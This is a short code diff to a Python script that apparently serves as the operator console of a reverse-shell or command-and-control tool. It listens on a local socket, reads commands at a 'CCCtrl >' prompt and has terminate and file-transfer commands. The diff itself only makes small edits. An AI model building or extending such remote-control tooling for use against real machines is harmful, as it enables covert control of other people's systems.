@@ -1,9 +1,13 @@
+#! /usr/bin/env python3
+
 import socket 
 import os # Needed for file operation
 import modules
 
+
 host = '127.0.0.1'
 port = 8080
+instruction = ''
 
 def connect():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -22,7 +26,7 @@ def connect():
     while True: 
         command = input("CCCtrl > ")
         if command == "==terminate":
-            conn.send('terminate')
+            conn.send('==terminate')
             conn.close() 
             break
         elif command == '==transfer': 
